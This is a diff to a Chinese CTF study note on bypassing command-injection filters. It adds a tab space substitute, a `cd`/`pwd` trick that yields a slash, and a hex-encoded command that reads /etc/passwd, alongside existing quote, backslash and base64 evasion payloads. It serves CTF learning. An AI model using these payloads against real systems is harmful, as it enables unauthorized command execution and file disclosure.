@@ -7,11 +7,14 @@ tags:: CTF/RCE
 	- `cat<flag.php`
 	- `<>`
 	- `{cat,flag.php}`
+	- tab
 	- `%20`
 	- `%09&&`
 - 反斜杠
 	- `l\s`
 	- 也可以这样：`tac<f\ile`
+- 斜杠
+	- `$(cd ..&&cd ..&cd ..&&cd ..&& pwd)`
 - 单引号
 	- `'l's`
 	- 也可以这样：`tac<f'i'le`
@@ -21,6 +24,8 @@ tags:: CTF/RCE
 	- `a='l';b=s;$a$b`
 - base64 编码
 	- `echo d2hvYW1p | base64 -d`
+- hex
+	- ``cat `xxd -r -p <<< 2f6574632f706173737764` ``
 - `ls`:
 	- `dir`
 - `cat`或文件名被 waf
